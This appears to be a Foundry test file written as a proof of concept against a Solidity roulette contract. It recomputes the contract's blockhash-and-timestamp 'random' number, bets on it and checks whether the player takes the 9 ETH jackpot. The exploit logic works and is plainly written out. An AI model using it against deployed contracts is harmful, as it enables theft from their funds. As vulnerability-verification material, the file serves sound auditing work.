// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/crypto_roulette.sol";

contract CryptoRouletteTest is Test {
    CryptoRoulette roulette;
    address player = address(0x1);
    uint256 constant BET_PRICE = 1 ether;

    function setUp() public {
        roulette = new CryptoRoulette();
        vm.deal(address(roulette), 10 ether); // Fund the contract
        vm.deal(player, 10 ether);
    }

    function testPredictableRandomNumber() public {
        console2.log("--- BEFORE-Trigger Play ---");
        uint256 contractBalanceBefore = address(roulette).balance;
        uint256 playerBalanceBefore = player.balance;
        console2.log("Contract balance:%d wei", contractBalanceBefore);
        console2.log("Player balance:%d wei", playerBalanceBefore);

        // Advance to new block for valid blockhash
        vm.roll(block.number + 1);
        
        // Predict using current block context
        uint256 blockTimestamp = block.timestamp;
        bytes32 blockHash = blockhash(block.number - 1);
        uint256 fullRand = uint256(keccak256(abi.encodePacked(blockTimestamp, blockHash)));
        uint8 predictedNumber = uint8(fullRand % 10) + 1;

        console2.log("--- Trigger Play ---");
        console2.log("Playing with predicted number:%d", predictedNumber);
        vm.prank(player);
        roulette.play{value: BET_PRICE}(predictedNumber);

        console2.log("--- AFTER-Trigger Play ---");
        uint256 contractBalanceAfter = address(roulette).balance;
        uint256 playerBalanceAfter = player.balance;
        console2.log("Contract balance:%d wei", contractBalanceAfter);
        console2.log("Player balance:%d wei", playerBalanceAfter);

        // Differential verification
        uint256 expectedWin = 9 ether;
        uint256 expectedPlayerWinBalance = playerBalanceBefore + expectedWin;
        uint256 expectedContractLossBalance = contractBalanceBefore - expectedWin;
        
        if (playerBalanceAfter == expectedPlayerWinBalance && 
            contractBalanceAfter == expectedContractLossBalance) {
            console2.log("RESULT: Vulnerability Exists - Player won exact 9 ETH proving predictable random number");
            console2.log("Vulnerability Exists: Predictable random number allows jackpot exploitation");
        } else {
            console2.log("Player balance changed by: %d wei", int256(playerBalanceAfter) - int256(playerBalanceBefore));
            console2.log("Contract balance changed by: %d wei", int256(contractBalanceAfter) - int256(contractBalanceBefore));
            console2.log("RESULT: Vulnerability not Exist - Balance changes don't match exploitation pattern");
            console2.log("Vulnerability not Exist: Predictable random number doesn't guarantee jackpots");
        }
    }

    function testMultiplePlaysToVerifyRandomness() public {
        vm.roll(block.number + 1);
        
        uint256 blockTimestamp = block.timestamp;
        bytes32 blockHash = blockhash(block.number - 1);
        uint256 fullRand = uint256(keccak256(abi.encodePacked(blockTimestamp, blockHash)));
        uint8 predictedNumber = uint8(fullRand % 10) + 1;

        uint256 wins;
        uint256 plays = 5;

        for (uint256 i = 0; i < plays; i++) {
            uint256 balanceBefore = player.balance;
            vm.prank(player);
            roulette.play{value: BET_PRICE}(predictedNumber);
            
            if (player.balance > balanceBefore) {
                wins++;
            }
            
            vm.roll(block.number + 1);
        }

        assertTrue(
            wins <= plays / 5,
            "Winning rate is too high, indicating predictable randomness"
        );
    }
}